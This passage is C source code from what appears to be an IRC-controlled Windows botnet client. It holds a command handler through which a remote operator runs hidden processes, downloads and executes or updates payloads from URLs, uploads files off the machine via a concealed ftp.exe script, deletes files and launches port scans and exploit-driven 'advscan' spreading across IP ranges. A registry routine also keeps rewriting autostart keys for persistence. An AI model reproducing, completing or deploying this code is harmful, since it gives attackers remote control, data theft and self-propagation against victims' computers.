//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(flusharp_cmd, a[s]) == 0) {
				if (FlushARPCache())
					_snprintf(sendbuf,sizeof(sendbuf),"%s ARP cache flushed",mn_title);
				else
					_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to flush ARP cache",mn_title);
				
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(flushdns_cmd, a[s]) == 0) {
				if (fDnsFlushResolverCache) {
					if (fDnsFlushResolverCache())
						_snprintf(sendbuf,sizeof(sendbuf),"%s DNS cache flushed",mn_title);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to flush DNS cache",mn_title);
				} else
					_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to load dnsapi.dll",mn_title);

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(currentip_cmd, a[s]) == 0) {
				int scanthread;
				if (a[s+1])
					scanthread = atoi(a[s+1]);
				else
					scanthread = findthreadnum(SCAN_THREAD);
				if (scanthread != 0)
					currentIP(sock, a[2], notice, scanthread);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_TFTPD
			else if (strcmp(tftpserver_cmd, a[s]) == 0) {
				if (findthreadid(TFTP_THREAD) > 0)
					sprintf(sendbuf ,"%s Already running",mn_title);
				else {
					TFTP tftp;
					(a[s+1])?(_snprintf(tftp.filename, sizeof(tftp.filename), a[s+1])):(GetModuleFileName(0,tftp.filename,sizeof(tftp.filename)));
					_snprintf(tftp.requestname, sizeof(tftp.requestname), ((a[s+2])?(a[s+2]):(filename)));
					tftp.port = tftpport;
					tftp.threads = 0;
					tftp.sock = sock;
					strncpy(tftp.chan, a[2], sizeof(tftp.chan)-1);
					tftp.notice = notice;
					tftp.silent = silent;

					sprintf(sendbuf, "%s TfTp Server started on Port: %d, File: %s, Request: %s", mn_title,tftp.port, tftp.filename, tftp.requestname);
					tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
					if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
						while (tftp.gotinfo == FALSE) 
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start server thread, error %d", mn_title,GetLastError());
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

			#ifndef NO_PATCHER
		//else if (strcmp(a[0], "patch") == 0)
		  else if (strcmp(patch_cmd, a[s]) == 0)
			
		{
			if (!checkos())
				return 1;

			PATCHER patcher;
			patcher.Sock = sock;
			patcher.Silent = silent;
			patcher.GotInfo = FALSE;
			//patcher.ThreadNum = addthread(PATCHER_THREAD);
			patcher.ThreadNum = addthread(sendbuf,PATCHER_THREAD,NULL);
			threads[patcher.ThreadNum].tHandle = CreateThread(NULL, 0, &PatcherThread, (LPVOID)&patcher, 0, &id);
			while (patcher.GotInfo == FALSE)
				Sleep(30);

			return 1;
		}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(currentthreads_cmd, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				sprintf(sendbuf ,"%s Currently %d Threads", mn_title,scanthreads);
				irc_privmsg(sock,a[2],sendbuf,notice);
				////addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(myip_cmd, a[s]) == 0) {
				sprintf(sendbuf ,"%s %s", mn_title,GetIP(sock));
				irc_privmsg(sock,a[2],sendbuf,notice);
				////addlog(sendbuf);

				return 1;
			}


//////////////////////////////////////////////////////////////////////////////////
//                  commands requiring at least 1 parameter                     //
//////////////////////////////////////////////////////////////////////////////////
			else if (a[s+1] == NULL) return 1;
			else if (strcmp(nick_cmd, a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				////addlogv("Nick changed to: '%s'.",a[s+1]);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(join_cmd, a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				////addlogv("Joined channel: '%s'.",a[s+1]);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(part_cmd, a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				////addlogv("Parted channel: '%s'.",a[s+1]);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(raw_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						////addlogv("IRC Raw: %s",y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(killthreads_cmd, a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"%s Stopped: %d thread(s)", mn_title,i);
					else
						sprintf(sendbuf,"%s No active threads found",mn_title);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					////addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"%s Killed thread: %s",mn_title,a[i]);
						else 
							sprintf(sendbuf,"%s Failed to kill thread: %s",mn_title,a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						////addlog(sendbuf);
					}
				}

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(prefix_cmd, a[s]) == 0) {
				prefix = a[s+1][0];
				sprintf(sendbuf,"%s Prefix changed to: '%c'",mn_title,a[s+1][0]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(openfile_cmd, a[s]) == 0) {
				if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
					sprintf(sendbuf,"%s File opened: %s ", mn_title,a[s+1]);
				else
					sprintf(sendbuf,"%s Couldn't open file: %s", mn_title,a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(server_cmd, a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"%s Server changed to: '%s'",mn_title,a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(delete_cmd, a[s]) == 0) { 
				if (DeleteFile(a[s+1])) 
					_snprintf(sendbuf,sizeof(sendbuf),"%s Deleted '%s'",mn_title,a[s+1]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError(""));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_IDENT
				else if (strcmp(ident_cmd, a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(IDENT_THREAD) > 0)
						sprintf(sendbuf ,"%s Already running",mn_title);
					else {
						sprintf(sendbuf,"%s Server running on Port: 113",mn_title);
						i = addthread(sendbuf,IDENT_THREAD,NULL);
						if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
							sprintf(sendbuf,"%s Failed to start server, error %d", mn_title,GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(IDENT_THREAD)) > 0)
						sprintf(sendbuf,"%s Server stopped. (%d thread(s) stopped)",mn_title,i);
					else
						sprintf(sendbuf,"%s No thread found",mn_title);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(gethost_cmd, a[s]) == 0) { 
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"%s Gethost: %s , Command: %s", mn_title,a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"%s Unable to extract Gethost command",mn_title);							
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"%s Gethost: %s", mn_title,a[s+1]);
					}
					////addlog(sendbuf);
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////
// 			       commands requiring at least 2 parameters          		    //
//////////////////////////////////////////////////////////////////////////////////

			else if (a[s+2] == NULL) return 1;
			
//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(privatemessage_cmd, a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						////addlogv("Privmsg: %s: %s", a[s+1], y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(action_cmd, a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
						////addlogv("Action: %s: %.",a[s+1], y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(cycle_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) 
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
				//addlog("Cycle");

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(mode_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						////addlogv("Mode change: %s",y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(delay_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) 
						Sleep(atoi(a[s+1])*1000);
					//addlog("Delay");
					return repeat + 1;
				}

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_DOWNLOAD
			else if (strcmp(update_cmd, a[s]) == 0) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "%s Downloading update from: %s", mn_title,a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start download thread, error %d", mn_title,GetLastError());
				} else
					sprintf(sendbuf,"%s ID must be different than current running process");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(execute_cmd, a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
							sprintf(sendbuf,"%s Couldn't execute file",mn_title);
						else
							sprintf(sendbuf,"%s Commands: %s",mn_title,y);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(rename_cmd, a[s]) == 0) {
				if (MoveFile(a[s+1],a[s+2]))
					_snprintf(sendbuf,sizeof(sendbuf),"%s Rename: '%s' to: '%s'", mn_title,a[s+1], a[s+2]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError(""));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////
// 			       commands requiring at least 3 parameters						//
//////////////////////////////////////////////////////////////////////////////////
			else if (a[s+3] == NULL) return 1;
#ifndef NO_DOWNLOAD
			else if (strcmp(download_cmd, a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "%s Downloading URL: %s to: %s", mn_title,a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start transfer thread, error %d", mn_title,GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);
				
				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SCAN
			else if (strcmp(portscan_cmd, a[s]) == 0) {
				SCAN scan;
				scan.addy.S_un.S_addr = finet_addr(a[s+1]);
				scan.port = atoi(a[s+2]);
				scan.delay = atoi(a[s+3]);
				scan.sock = sock;
				strncpy(scan.chan,  a[2], sizeof(scan.chan)-1);
				scan.notice = notice;
				scan.silent = silent;

				sprintf(sendbuf, "%s  Started: %s:%d with delay: %d(ms)", sc_title, finet_ntoa(scan.addy), scan.port, scan.delay);
				scan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
				if (threads[scan.threadnum].tHandle = CreateThread(NULL, 0, &ScanThread, (LPVOID)&scan, 0, &id)) {
					while(scan.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start, thread, error %d", sc_title, GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				////addlog(sendbuf);

				return 1;
			}
#endif 
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_ADVSCAN
			else if (strcmp(allscan_cmd, a[s]) == 0) {
				if (!a[s+1] || !a[s+2] || !a[s+3]) {
					sprintf(sendbuf, "%s Failed to start, syntax is invalid",sc_title);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					return 1;
				}
				for(int i=0; allscan[i].isend != false; i++) { }
				for(int sne=0; allscan[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + 400/i > MAXSCANTHRD) {
						sprintf(sendbuf ,"%s Already %d threads. Too many specified.", sc_title,scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						advscan.threads = atoi(a[s+1]);
						advscan.delay = atoi(a[s+2]);
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = atoi(a[s+3]);
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, allscan[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, "%s Failed to start, syntax is invalid",sc_title);
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							////addlog(sendbuf);

							return 1;
						}
						if (a[s+4] && a[s+4][0] != '#') {
							_snprintf(advscan.ip,sizeof(advscan.ip),a[s+4]);
							advscan.random = ((strchr(a[s+4],'x'))?(TRUE):(FALSE));
						} else {
							if (parameters['a'] || parameters['b'] || parameters['r']) {
								SOCKADDR_IN ssin;
								int ssin_len=sizeof(ssin);
								fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
								ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
								strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
								
								if (parameters['r']) {
									int extractip = ((parameters['a']) ? 3 : 2);
									for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
									advscan.random = TRUE;
								} else
									advscan.random = FALSE;
							} else {
								sprintf(sendbuf, "%s Failed to start, no range specified",sc_title);
								if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
								////addlog(sendbuf);
							
								return 1;
							}
						}
						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (a[s+5])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
						else if (a[s+4] && a[s+4][0] == '#')
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+4]);
						else if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "%s %s Method started at %s :%s for %d minutes %d delay %d threads", 
							sc_title, ((advscan.random)?("Random"):("Sequential")), advscan.ip, exploit[i].name, advscan.minutes, advscan.delay, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"%s Failed to start thread, error: %d", sc_title, GetLastError());
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						////addlog(sendbuf);
					}
				}
				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////
// 			       commands requiring at least 4 parameters						//
//////////////////////////////////////////////////////////////////////////////////
			else if (a[s+4] == NULL) return 1;
#ifndef NO_ADVSCAN
			else if (strcmp(advscan_cmd, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"%s already %d threads. too many specified", sc_title,scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); 
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "%s failed to start, syntax is invalid",sc_title);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						////addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "%s failed to start, no range specified",sc_title);
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							////addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "%s %s Method started at %s :%s for %d minutes %d delay %d threads", 
							sc_title, ((advscan.random)?("Random"):("Sequential")), advscan.ip, exploit[i].name, advscan.minutes, advscan.delay, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start thread, error: %d", sc_title,GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					////addlog(sendbuf);

					return 1;
				}
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
// 			        commands requiring at least 5 parameters					//	
//////////////////////////////////////////////////////////////////////////////////
 
		    else if (a[s+5] == NULL) return 1; 
			else if (strcmp(upload_cmd, a[s]) == 0) { 
				if (!FileExists(a[s+5])) { 
					sprintf(sendbuf,"%s File not found: %s", mn_title,a[s+5]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					////addlog(sendbuf);
					return 1; 
				} 
				char tmpftp[MAX_PATH],tmpsys[MAX_PATH]; 

				srand(GetTickCount());
				sprintf(tmpftp,"%s\\%i%i%i.dll",tmpsys,rand()%999,rand()%99,rand()%9); 

				FILE * fp = fopen(tmpftp,"ab"); 
				if (fp != NULL) { 
					fprintf(fp, "open %s\r\n%s\r\n%s\r\n%s\r\nput %s\r\nbye\r\n",
						a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]); 
					fclose(fp); 

					char cmdline[256]; 
					sprintf(cmdline,"-s:%s",tmpftp); 
					if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE))
						sprintf("%s Uploading file: %s  to: %s",mn_title,a[s+5],a[s+1]);
					else
						sprintf("%s Uploading file: %s  to: %s failed",mn_title,a[s+5],a[s+1]);

					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice); 
					////addlog(sendbuf);
		
					while (FileExists(tmpftp)) 
						remove(tmpftp); 
				}

				return 1;
			}
		}
	}

	return repeat;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_REGISTRY
int registry_delay=60000;
#endif

AUTOSTART autostart[]={
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey1},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey2},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey4}
};

void AutoStartRegs(char *nfilename)
{
	HKEY key;

	for (int i=0; i < (sizeof(autostart) / sizeof(AUTOSTART)); i++) {
		fRegCreateKeyEx(autostart[i].hkey, autostart[i].subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		if (nfilename)
			fRegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)nfilename, strlen(nfilename));
		else
			fRegDeleteValue(key, valuename); 
		fRegCloseKey(key); 
	}
   
	return;
}

#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param)
{
	char *nfilename = (char *)param;

	while (1) {
		AutoStartRegs(nfilename);
		Sleep(registry_delay);
	}
	return 0;
}
#endif

// globals
#ifdef DEBUG_LOGGING
FILE *gfp;
#endif

#ifdef DEBUG_LOGGING
void opendebuglog(void)
{
	gfp = fopen(logfile, "ab");

	return;
}

void debuglog(char *buffer, BOOL crlf)
{
	if (gfp != NULL) {
		if (crlf)
			fprintf(gfp,"%s\r\n",buffer);
		else
			fprintf(gfp,"%s",buffer);
		fflush(gfp);
	}

	return;
}

void closedebuglog(void)
{
	fclose(gfp);

	return;
}
#endif

#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	switch(dwCtrlType) {
	case CTRL_C_EVENT:
	case CTRL_BREAK_EVENT:
	case CTRL_CLOSE_EVENT:
		return TRUE;
	}
 
	return FALSE;
}

void OpenConsole(void)
{
	AllocConsole();
 
	int hCrt = _open_osfhandle((long)GetStdHandle(STD_OUTPUT_HANDLE),_O_TEXT);
	FILE *hf = _fdopen(hCrt,"w");
	*stdout = *hf;
	int i = setvbuf(stdout,NULL,_IONBF,0); 

	hCrt = _open_osfhandle((long)GetStdHandle(STD_ERROR_HANDLE),_O_TEXT);
	hf = _fdopen(hCrt,"w");
	*stderr = *hf;
	i = setvbuf(stdout,NULL,_IONBF,0); 
 
	SetConsoleCtrlHandler(HandlerRoutine, true);

	return;
}
#endif

#ifndef NO_SCAN

// checks ip for open port
DWORD WINAPI ScanConnectThread(LPVOID param)
{
	static char sendbuf[IRCLINE];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->cgotinfo = TRUE;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)scan.port);
	ssin.sin_addr = scan.addy;

	SOCKET sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock != INVALID_SOCKET) {
		DWORD err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		threads[scan.threadnum].sock = sock;
		if (err != SOCKET_ERROR) {
			sprintf(sendbuf,"%s IP: %s Port: %d is open", sc_title,finet_ntoa(scan.addy), scan.port);
			irc_privmsg(scan.sock, scan.chan, sendbuf, scan.notice);
			////addlog(sendbuf);
		}
	} 
	fclosesocket(sock);

	return 0;
}

// scan a range of IPs for an open port
DWORD WINAPI ScanThread(LPVOID param)
{
	DWORD id, host;
	HANDLE th;
	char str[128];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->gotinfo = TRUE;

	while(1) {
		sprintf(str, "IP: %s Port: %d", sc_title, finet_ntoa(scan.addy), scan.port);
